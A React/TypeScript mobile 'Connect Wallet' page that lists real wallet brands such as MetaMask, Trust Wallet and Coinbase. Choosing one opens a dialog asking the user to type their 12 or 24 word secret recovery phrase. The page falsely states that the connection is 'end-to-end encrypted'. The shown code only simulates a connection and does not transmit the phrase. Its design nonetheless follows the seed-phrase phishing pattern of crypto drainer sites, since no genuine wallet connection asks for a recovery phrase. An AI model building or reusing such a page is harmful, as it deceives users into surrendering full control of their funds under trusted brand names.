import { MobileLayout } from "@/components/layout/mobile-layout";
import { ArrowLeft, ChevronRight, Search, ShieldCheck, Lock } from "lucide-react";
import { Link, useLocation } from "wouter";
import { Input } from "@/components/ui/input";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useState } from "react";

const WALLETS = [
  { name: "Wallet Connect", url: "walletconnect.com", color: "bg-blue-600" },
  { name: "Onchain", url: "onchain.com", color: "bg-indigo-500" },
  { name: "Trust Wallet", url: "trustwallet.com", color: "bg-blue-400" },
  { name: "MetaMask", url: "metamask.io", color: "bg-orange-500" },
  { name: "Blockchain", url: "blockchain.com", color: "bg-purple-600" },
  { name: "Phantom", url: "phantom.app", color: "bg-purple-500" },
  { name: "Coinbase", url: "coinbase.com", color: "bg-blue-700" },
  { name: "Binance Web3", url: "binance.com", color: "bg-yellow-500" },
  { name: "OKX Wallet", url: "okx.com", color: "bg-black" },
];

export default function ConnectWallet() {
  const [_, setLocation] = useLocation();
  const [search, setSearch] = useState("");
  const [selectedWallet, setSelectedWallet] = useState<typeof WALLETS[0] | null>(null);
  const [phrase, setPhrase] = useState("");
  const [isConnecting, setIsConnecting] = useState(false);

  const filteredWallets = WALLETS.filter(w => 
    w.name.toLowerCase().includes(search.toLowerCase()) || 
    w.url.toLowerCase().includes(search.toLowerCase())
  );

  const handleWalletClick = (wallet: typeof WALLETS[0]) => {
    setSelectedWallet(wallet);
    setPhrase("");
  };

  const handleConnect = () => {
    if (!phrase) return;
    
    setIsConnecting(true);
    // Simulate connection delay
    setTimeout(() => {
      setIsConnecting(false);
      setSelectedWallet(null);
      setLocation("/wallet"); 
    }, 2000);
  };

  return (
    <MobileLayout>
      <div className="bg-white min-h-screen pb-20">
        <div className="px-6 pt-8 pb-4 sticky top-0 bg-white z-10 border-b border-gray-50">
          <div className="flex items-center gap-4 mb-6">
            <Link href="/wallet">
              <div className="w-10 h-10 rounded-full bg-gray-50 flex items-center justify-center text-gray-600 hover:bg-gray-100 cursor-pointer">
                <ArrowLeft size={20} />
              </div>
            </Link>
            <h1 className="text-xl font-bold">Connect Wallet</h1>
          </div>

          <div className="relative">
            <Search className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-400" size={18} />
            <Input 
              placeholder="Search wallet..." 
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              className="pl-10 bg-gray-50 border-none h-12 rounded-xl text-base"
            />
          </div>
        </div>

        <div className="p-4">
          <div className="flex flex-col gap-3">
            {filteredWallets.map((wallet) => (
              <button 
                key={wallet.name}
                onClick={() => handleWalletClick(wallet)}
                className="flex items-center gap-4 p-4 bg-white rounded-2xl border border-gray-100 shadow-sm hover:shadow-md hover:border-blue-100 active:scale-[0.99] transition-all text-left group"
              >
                <div className={`w-14 h-14 rounded-2xl ${wallet.color} flex items-center justify-center text-white font-bold text-xl shadow-sm shrink-0 group-hover:scale-105 transition-transform`}>
                  {wallet.name[0]}
                </div>
                <div className="flex-1 min-w-0">
                  <h4 className="font-bold text-gray-900 text-base truncate mb-0.5">{wallet.name}</h4>
                  <p className="text-sm text-gray-500 font-medium truncate">{wallet.url}</p>
                </div>
                <div className="w-8 h-8 rounded-full bg-gray-50 flex items-center justify-center text-gray-400 group-hover:bg-blue-50 group-hover:text-blue-600 transition-colors">
                  <ChevronRight size={18} />
                </div>
              </button>
            ))}
            
            {filteredWallets.length === 0 && (
              <div className="text-center py-12 text-gray-400">
                <p>No wallets found matching "{search}"</p>
              </div>
            )}
          </div>
        </div>

        <Dialog open={!!selectedWallet} onOpenChange={(open) => !open && setSelectedWallet(null)}>
          <DialogContent className="sm:max-w-md rounded-2xl w-[90%]">
            <DialogHeader className="flex flex-col items-center text-center pt-4">
              {selectedWallet && (
                <div className={`w-16 h-16 rounded-2xl ${selectedWallet.color} flex items-center justify-center text-white font-bold text-2xl shadow-md mb-4`}>
                  {selectedWallet.name[0]}
                </div>
              )}
              <DialogTitle className="text-xl font-bold">
                Connect {selectedWallet?.name}
              </DialogTitle>
            </DialogHeader>
            
            <div className="space-y-4 py-2">
              <div className="space-y-2">
                <p className="text-sm text-gray-500 text-center px-4">
                  Enter your secret recovery phrase to connect your wallet securely.
                </p>
                <Textarea 
                  placeholder="Enter your 12 or 24 word recovery phrase..." 
                  className="min-h-[120px] resize-none bg-gray-50 border-gray-200 focus:border-primary rounded-xl p-4"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                />
              </div>

              <div className="space-y-3 pt-2">
                <Button 
                  className="w-full h-12 rounded-xl font-bold text-base"
                  onClick={handleConnect}
                  disabled={isConnecting || !phrase}
                >
                  {isConnecting ? "Connecting..." : "Connect to Wallet"}
                </Button>
                
                <div className="flex items-center justify-center gap-1.5 text-xs text-gray-400">
                  <Lock size={12} />
                  <span>Connection is private and end-to-end encrypted.</span>
                </div>
              </div>
            </div>
          </DialogContent>
        </Dialog>
      </div>
    </MobileLayout>
  );
}
